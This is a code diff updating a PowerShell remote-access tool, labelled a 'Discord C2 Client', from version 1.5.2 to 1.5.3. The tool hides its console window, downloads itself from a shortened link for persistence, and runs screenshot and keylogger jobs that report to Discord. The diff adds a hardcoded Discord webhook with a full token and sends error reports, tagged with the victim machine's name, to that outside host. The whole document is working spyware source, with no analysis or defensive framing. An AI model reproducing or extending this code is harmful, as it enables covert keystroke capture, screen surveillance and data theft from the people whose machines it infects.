@@ -1,5 +1,5 @@
 # Discord C2 Client Script
-# Version: 1.5.2
+# Version: 1.5.3
 # Description: A PowerShell-based C2 framework using a Discord bot for remote control, data exfiltration, and pranks.
 # Setup Instructions:
 # 1. Create a Discord bot at https://discord.com/developers/applications/
@@ -12,13 +12,14 @@
 # Global Configuration
 $global:token = $env:DISCORD_TOKEN # Set via Flipper Zero injection or manually
 $global:parent = "https://is.gd/y92xe4" # URL for script download (persistence)
-$global:version = "1.5.2"
+$global:version = "1.5.3"
 $global:HideConsole = 1 # 1 to hide console window
 $global:spawnChannels = 1 # 1 to create new channels on session start
 $global:InfoOnConnect = 1 # 1 to send client info on connect
 $global:defaultstart = 1 # 1 to start all jobs automatically
 $global:timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
 $global:logPath = "$env:Temp\c2_errors.log"
+$global:errorWebhook = "https://discord.com/api/webhooks/1280032478584901744/ssQdPPlqALlxxWc6JYZFCWHrqP9YBMJmC3ClX9OZk5rHLYVTB1OUbfQICNXuMCwyd8CT"
 
 # Initialize Logging
 function Write-Log {
@@ -29,11 +30,22 @@ function Write-Log {
     )
     $logMessage = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [$Level] $Message"
     $logMessage | Out-File -FilePath $global:logPath -Append -Encoding UTF8
-    if ($ChannelId -and $Level -eq "ERROR") {
+    if ($Level -eq "ERROR") {
+        # Send to session-control channel if available
+        if ($ChannelId) {
+            try {
+                Send-DiscordMessage -ChannelId $ChannelId -Message ":no_entry: ``$logMessage`` :no_entry:"
+            } catch {
+                $logMessage = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [ERROR] Failed to send error to Discord channel: $_"
+                $logMessage | Out-File -FilePath $global:logPath -Append -Encoding UTF8
+            }
+        }
+        # Send to error webhook
         try {
-            Send-DiscordMessage -ChannelId $ChannelId -Message ":no_entry: ``$logMessage`` :no_entry:"
+            $webhookBody = @{ content = ":no_entry: **$env:COMPUTERNAME** Error: ``$logMessage`` :no_entry:"; username = $env:COMPUTERNAME } | ConvertTo-Json
+            Invoke-RestMethod -Uri $global:errorWebhook -Method Post -ContentType "application/json" -Body $webhookBody
         } catch {
-            $logMessage = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [ERROR] Failed to send error to Discord: $_"
+            $logMessage = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [ERROR] Failed to send error to webhook: $_"
             $logMessage | Out-File -FilePath $global:logPath -Append -Encoding UTF8
         }
     }
@@ -308,6 +320,30 @@ function Hide-Console {
 # Job Scriptblocks (e.g., screenJob, doKeyjob)
 $screenJob = {
     param ([string]$token, [string]$ScreenshotID, [string]$Webhook)
+    function Write-Log {
+        param ([string]$Message, [string]$Level = "INFO")
+        $logMessage = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [$Level] $Message"
+        $logMessage | Out-File -FilePath $env:Temp\c2_errors.log -Append -Encoding UTF8
+        if ($Level -eq "ERROR") {
+            try {
+                $wc = New-Object System.Net.WebClient
+                $wc.Headers.Add("Authorization", "Bot $token")
+                $jsonBody = @{ content = ":no_entry: ``$logMessage`` :no_entry:"; username = $env:COMPUTERNAME } | ConvertTo-Json
+                $wc.Headers.Add("Content-Type", "application/json")
+                $wc.UploadString("https://discord.com/api/v10/channels/$ScreenshotID/messages", "POST", $jsonBody)
+            } catch {
+                $logMessage = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [ERROR] Failed to send error to Discord: $_"
+                $logMessage | Out-File -FilePath $env:Temp\c2_errors.log -Append -Encoding UTF8
+            }
+            try {
+                $webhookBody = @{ content = ":no_entry: **$env:COMPUTERNAME** Error: ``$logMessage`` :no_entry:"; username = $env:COMPUTERNAME } | ConvertTo-Json
+                Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1280032478584901744/ssQdPPlqALlxxWc6JYZFCWHrqP9YBMJmC3ClX9OZk5rHLYVTB1OUbfQICNXuMCwyd8CT" -Method Post -ContentType "application/json" -Body $webhookBody
+            } catch {
+                $logMessage = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [ERROR] Failed to send error to webhook: $_"
+                $logMessage | Out-File -FilePath $env:Temp\c2_errors.log -Append -Encoding UTF8
+            }
+        }
+    }
     function Send-File {
         param ([string]$FilePath)
         $url = "https://discord.com/api/v10/channels/$ScreenshotID/messages"
@@ -326,7 +362,7 @@ $screenJob = {
         }
     }
     if (-not (Test-Path "$env:Temp\ffmpeg.exe")) {
-        Write-Log -Message "FFmpeg not found for screenshots" -Level "ERROR" -ChannelId $ScreenshotID
+        Write-Log -Message "FFmpeg not found for screenshots" -Level "ERROR"
         return
     }
     while ($true) {
@@ -337,7 +373,7 @@ $screenJob = {
             Remove-Item -Path $mkvPath -Force
             Start-Sleep -Seconds 5
         } catch {
-            Write-Log -Message "Screenshot job failed: $_" -Level "ERROR" -ChannelId $ScreenshotID
+            Write-Log -Message "Screenshot job failed: $_" -Level "ERROR"
             Start-Sleep -Seconds 5
         }
     }
@@ -345,6 +381,30 @@ $screenJob = {
 
 $doKeyjob = {
     param ([string]$token, [string]$keyID)
+    function Write-Log {
+        param ([string]$Message, [string]$Level = "INFO")
+        $logMessage = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [$Level] $Message"
+        $logMessage | Out-File -FilePath $env:Temp\c2_errors.log -Append -Encoding UTF8
+        if ($Level -eq "ERROR") {
+            try {
+                $wc = New-Object System.Net.WebClient
+                $wc.Headers.Add("Authorization", "Bot $token")
+                $jsonBody = @{ content = ":no_entry: ``$logMessage`` :no_entry:"; username = $env:COMPUTERNAME } | ConvertTo-Json
+                $wc.Headers.Add("Content-Type", "application/json")
+                $wc.UploadString("https://discord.com/api/v10/channels/$keyID/messages", "POST", $jsonBody)
+            } catch {
+                $logMessage = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [ERROR] Failed to send error to Discord: $_"
+                $logMessage | Out-File -FilePath $env:Temp\c2_errors.log -Append -Encoding UTF8
+            }
+            try {
+                $webhookBody = @{ content = ":no_entry: **$env:COMPUTERNAME** Error: ``$logMessage`` :no_entry:"; username = $env:COMPUTERNAME } | ConvertTo-Json
+                Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1280032478584901744/ssQdPPlqALlxxWc6JYZFCWHrqP9YBMJmC3ClX9OZk5rHLYVTB1OUbfQICNXuMCwyd8CT" -Method Post -ContentType "application/json" -Body $webhookBody
+            } catch {
+                $logMessage = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [ERROR] Failed to send error to webhook: $_"
+                $logMessage | Out-File -FilePath $env:Temp\c2_errors.log -Append -Encoding UTF8
+            }
+        }
+    }
     function Send-Message {
         param ([string]$Message)
         $url = "https://discord.com/api/v10/channels/$keyID/messages"
@@ -399,21 +459,29 @@ $doKeyjob = {
                 $pressed.Restart()
                 Start-Sleep -Milliseconds 10
             } catch {
-                Write-Log -Message "Keylog job failed: $_" -Level "ERROR" -ChannelId $keyID
+                Write-Log -Message "Keylog job failed: $_" -Level "ERROR"
             }
         }
     } catch {
-        Write-Log -Message "Keylog initialization failed: $_" -Level "ERROR" -ChannelId $keyID
+        Write-Log -Message "Keylog initialization failed: $_" -Level "ERROR"
     }
 }
 
 function Start-AllJobs {
     try {
-        Start-Job -ScriptBlock $screenJob -Name Screen -ArgumentList $global:token, $global:ScreenshotID, $global:ScreenshotWebhook
-        Write-Log -Message "Started Screenshot job" -Level "INFO"
+        if ($global:ScreenshotID) {
+            Start-Job -ScriptBlock $screenJob -Name Screen -ArgumentList $global:token, $global:ScreenshotID
+            Write-Log -Message "Started Screenshot job" -Level "INFO"
+        } else {
+            Write-Log -Message "Cannot start Screenshot job: ScreenshotID not set" -Level "ERROR"
+        }
         Start-Sleep -Seconds 1
-        Start-Job -ScriptBlock $doKeyjob -Name Keys -ArgumentList $global:token, $global:keyID
-        Write-Log -Message "Started Keycapture job" -Level "INFO"
+        if ($global:keyID) {
+            Start-Job -ScriptBlock $doKeyjob -Name Keys -ArgumentList $global:token, $global:keyID
+            Write-Log -Message "Started Keycapture job" -Level "INFO"
+        } else {
+            Write-Log -Message "Cannot start Keycapture job: keyID not set" -Level "ERROR"
+        }
         # Add other jobs (webcam, microphone, etc.) here...
         Send-DiscordMessage -ChannelId $global:SessionID -Message ":white_check_mark: All jobs started :white_check_mark:"
     } catch {
